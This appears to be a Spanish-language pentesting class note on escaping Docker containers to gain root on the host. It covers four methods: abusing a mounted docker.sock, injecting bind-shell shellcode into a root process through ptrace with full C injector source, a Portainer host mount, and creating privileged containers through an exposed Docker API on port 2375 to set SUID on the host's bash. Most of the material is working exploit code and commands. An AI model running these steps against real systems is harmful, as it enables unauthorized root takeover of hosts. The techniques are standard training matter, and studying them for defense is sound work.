# Docker Breakout

Tags: #Linux #DockerBreackout #Escalada #Root #Privilegios 

En la clase actual, exploraremos diversas técnicas para abusar de **Docker** con el objetivo de elevar nuestros privilegios de usuario y escapar del contenedor hacia la máquina host. Examinaremos situaciones específicas y discutiremos las implicaciones de seguridad en cada caso.

Las técnicas que se tratarán en esta clase incluyen:

- Uso de monturas en el despliegue de contenedores para acceder a archivos privilegiados del sistema host. Analizaremos cómo un atacante puede aprovechar las monturas para manipular los archivos del host y comprometer la seguridad del sistema.
- Despliegue de contenedores con la compartición de procesos (**–pid=host**) y permisos privilegiados (**–privileged**). Veremos cómo inyectar un shellcode malicioso en un proceso en ejecución como root, lo que podría permitir al atacante tomar control del sistema.
- Uso de **Portainer** para administrar el despliegue de un contenedor. Discutiremos cómo, mediante el empleo de monturas, un atacante podría ingresar y manipular archivos privilegiados del sistema host y escapar del contenedor.
- Abuso de la **API** de **Docker** por el puerto **2375** para la creación de imágenes, despliegue de contenedores e inyección de comandos privilegiados en la máquina host. Examinaremos cómo un atacante puede explotar la API de Docker para comprometer la seguridad del host y lograr la ejecución de comandos con privilegios elevados.

Al finalizar esta clase, comprenderás las vulnerabilidades potenciales asociadas con Docker y aprenderás a identificar los posibles riesgos de seguridad en entornos basados en contenedores.


## Docker Breakout

Estando dentro de un contenedor Docker vamos a poder escalar privilegios 'escapando' del contenedor. 

### Forma 1

```bash 
❯ docker run --rm -dit -v /var/run/docker.sock:/var/rundocker.sock --name ubuntuServer ubuntu  # Nos crearemos un contenedor 1 de la imagen descargada anteriormente llamada 'ubuntuServer' y le diremos que queremos que el 'docker.sock' de la maquina victima nos lo copie en la misma ruta del contenedor
❯ docker exec -it ubuntuServer bash        # Ingresamos al contenedor 'ubuntuServer' por medio de una bash como root
	❯ apt install docker.io                    # Dentro del contenedor instalamos Docker
	❯ docker images                            # Miramos las imagenes  
	❯ docker ps                                # Miramos los contenedores 
	❯ docker run --rm -dit -v /:/mnt/root --name privesc ubuntu # Desplegaremos un contenedor con una montura de la raiz de la primer maquina y que la monte en el dir /mnt/root del contenedor 2, esto se logra porque nos etsamos comunicando con el unix socket file de la maquina host, la raiz del nuevo contenedor hara alucion a la raiz de la maquina actual (primer maquina) 
	❯ docker exec -it privesc bash        # Ingresamos al contenedor 'privesc' y ahi podremos darle permisos SUID a la bash, por lo que se vera reflejada en la maquina host
```


### Forma 2

```bash 
❯ docker run --rm -dit --pid=host --name ubuntuServer ubuntu  # Nos crearemos un contenedor de una imagen antes descargada, pid = Hacer que los procesos de la maquina host los podamos ver y podamos interactuar con ellos dentro del contenedor 
❯ docker exec -it ubuntuServer bash        # Ingresamos al contenedor 'ubuntuServer' por medio de una bash como root
	❯ ps -faux                            # Miramos los procesos del contenedor y descubrimos que hay uno proceso en el cual tenemos un servicio y lo ejecuta root, nosotros podemos inyectar 'shellcode' a bajo proceso para poder hacer la escalada
```

* [Infecting-Running-Processes](https://0x00sec.org/t/linux-infecting-running-processes/1097)
* [Github-Infect-Running-Process](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c)
* [CVE-41128](https://www.exploit-db.com/exploits/41128)

Usaremos el código de la pagina anterior para poder hacer el ataque
```bash 
# Cabe mencionar que debemos de tener la capabilitie de Ptrace activada, de lo contrario la descargamos y volvemos as desplegar el contenedor 
❯ docker run --rm -dit --pid=host --cap-add=SYS_PTRACE --name ubuntuServer ubuntu  # Nos crearemos un contenedor
❯ docker run --rm -dit --pid=host --privileged --name ubuntuServer ubuntu  # Nos crearemos un contenedor, con permiso a todas las capabilities

# Con ese servicio abierto nos montaremos una BindShell
```

Creamos el archivo llamado 'infect.c' que ejecutaremos en el contenedor, el cual se aprovechara del proceso que esta corriendo root, el cual le agregaremos parte del CVE 41128
```bash
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#include <sys/user.h>
#include <sys/reg.h>

#define SHELLCODE_SIZE 87

unsigned char *shellcode = 
  "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05";


int
inject_data (pid_t pid, unsigned char *src, void *dst, int len)
{
  int      i;
  uint32_t *s = (uint32_t *) src;
  uint32_t *d = (uint32_t *) dst;

  for (i = 0; i < len; i+=4, s++, d++)
    {
      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) < 0)
	{
	  perror ("ptrace(POKETEXT):");
	  return -1;
	}
    }
  return 0;
}

int
main (int argc, char *argv[])
{
  pid_t                   target;
  struct user_regs_struct regs;
  int                     syscall;
  long                    dst;

  if (argc != 2)
    {
      fprintf (stderr, "Usage:\n\t%s pid\n", argv[0]);
      exit (1);
    }
  target = atoi (argv[1]);
  printf ("+ Tracing process %d\n", target);

  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) < 0)
    {
      perror ("ptrace(ATTACH):");
      exit (1);
    }

  printf ("+ Waiting for process...\n");
  wait (NULL);

  printf ("+ Getting Registers\n");
  if ((ptrace (PTRACE_GETREGS, target, NULL, &regs)) < 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }
  

  /* Inject code into current RPI position */

  printf ("+ Injecting shell code at %p\n", (void*)regs.rip);
  inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);

  regs.rip += 2;
  printf ("+ Setting instruction pointer to %p\n", (void*)regs.rip);

  if ((ptrace (PTRACE_SETREGS, target, NULL, &regs)) < 0)
    {
      perror ("ptrace(GETREGS):");
      exit (1);
    }
  printf ("+ Run it!\n");

 
  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) < 0)
	{
	  perror ("ptrace(DETACH):");
	  exit (1);
	}
  return 0;

}
```

```bash 
❯ gcc inject.c -o inject            # Después lo compilamos en la maquina victima 
❯ ps -faux | grep python            # Buscamos el PID que le pasaremos al archivo, para este caso es el 14326 ya que siempre cambia 
❯ ./inject 14326

+ Tracing process 14326
+ Waiting for process...
+ Getting Registers
+ Injecting shell code at 0x7f80246aad47
+ Setting instruction pointer to 0x7f80246aad49
+ Run it!
```

Esto significa que te abre el puerto 5600 en la maquina host. 
```bash 
❯ nc 172.17.0.1 5600                 # Nos conectamos al puerto 5600 del contenedor y esta es la direccion del host, por lo tanto seremos root en el host 
❯ script /dev/null -c bash           # Activar la bash 
❯ Ctrl + z
# Le damos el tratamiento a la bash 
```


### Forma 3 

Portainer: Es una herramienta web open-source que permite gestionar contenedores Docker. Permite administrar contenedores de forma remota o local, la infraestructura de soporte y todos los aspectos de las implementaciones de Kubernetes, Docker standalone y Docker Swarm. 

```bash 
❯ docker run -dit -p 8000:8000 -p 9000:9000 --name portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v /docker/portainer/data:/data portainer/portainer-ce               # Nos crearemos un contenedor y descargará la imagen por internet 

# Nos desplegara un entorno gráfico por el puerto 9000
```


[![DB1.png](https://i.postimg.cc/4yrX0s5Z/DB1.png)](https://postimg.cc/H89GcGRP)
[![DB2.png](https://i.postimg.cc/d1fF7wgd/DB2.png)](https://postimg.cc/XG9mmSj7)
[![DB3.png](https://i.postimg.cc/7Y2H2JHL/DB3.png)](https://postimg.cc/2VCNp6Bp)
[![DB4.png](https://i.postimg.cc/Dw32df0P/DB4.png)](https://postimg.cc/0bZR9spz)
[![DB5.png](https://i.postimg.cc/2yBDhgft/DB5.png)](https://postimg.cc/XB3m0HqK)
[![DB6.png](https://i.postimg.cc/252rD4w0/DB6.png)](https://postimg.cc/8FJqdfxv)
[![DB7.png](https://i.postimg.cc/cJs02DQK/DB7.png)](https://postimg.cc/FYnMJVCm)
[![DB8.png](https://i.postimg.cc/4nkT5wfx/DB8.png)](https://postimg.cc/V0RTsq0x)

Esos archivos corresponden a la maquina host real. Y como estamos como root, podemos hacer lo que sea., por lo que le agregamos desde esa consola los permisos SUID a la bash real y al volver al host podemos ejecutar desde ahí el comando 
```bash 
❯ bash -p                # Obtener una bash privilegiada en el host 
```


### Forma 4

Para este caso vamos a abusar de la API de Docker. 
* Puerto de operación **2375**
* Puerto de operación con HTTPS **2376**

* [Enable-TCP-Port-2375-Docker](https://gist.github.com/styblope/dc55e0ad2a9848f2cc3307d4819d819f)

```bash 
❯ netstat -nat                           # Para mirar los puerto abiertos y encontrar el 3275, 3276
```

* [Hacktricks-2375/2376](https://book.hacktricks.xyz/network-services-pentesting/2375-pentesting-docker)
Dentro del contenedor 
```bash 
❯ echo '' > /dev/tcp/172.17.0.1/2375     # Forma para saber si el puerto esta activo, si no devuleve nada quiee decir que el codigo de estado es exitoso

	# IP = Maquina host 
	# 2375 = Puerto de la API
```

Crearemos una imagen con nombre 'test', la raíz de la maquina host se desplegara en el dir **/mnt/** de muestro contenedor.
```bash 
❯  curl http://172.17.0.1:2375/containers/json | jq            # Listar los contenedores que existen 
❯  curl http://172.17.0.1:2375/images/json | jq                # Listar las imagenes que existen 

❯ curl -X POST -H "Content-Type: application/json" http://172.17.0.1:2375/containers/create?name=test -d '{"Image":"ubuntu:latest", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
```

```bash 
{"Id":"cf320dcc20e4d4e121bf7d7e1fa360e9883a00a7d8ddf3035001b91b219d936c"}
```

Nos desplegara un contenedor con un identificador similar. 

Colocaremos el ID anterior y se arrancara el contenedor con el nombre 'test'.
```bash 
❯ curl -X POST -H "Content-Type: application/json" http://172.17.0.1:2375/containers/cf320dcc20e4d4e121bf7d7e1fa360e9883a00a7d8ddf3035001b91b219d936c/start?name=test
```

Aquí es donde haremos la ejecución de comandos. Por lo que le asignaremos SUID a la bash del contenedor, pero como esta conectada al host, quiere decir que le asignaremos el SUID a la bash de host.
```bash 
❯ curl -X POST -H "Content-Type: application/json" http://172.17.0.1:2375/containers/cf320dcc20e4d4e121bf7d7e1fa360e9883a00a7d8ddf3035001b91b219d936c/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "chmod u+s /mnt/bin/bash"]}'
```

Pero no se hace SUID automáticamente, si no que debemos de ejecutar el sig. comando con el ID que te regresa el comando anterior y esto ejecutara el comando y la hará SUID.
```bash 
❯ curl -X POST -H "Content-Type: application/json" http://172.17.0.1:2375/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'
```

Ahora en el host
```bash 
❯ bash -p                   # Nos lanzamos una bash con privilegios temporales
```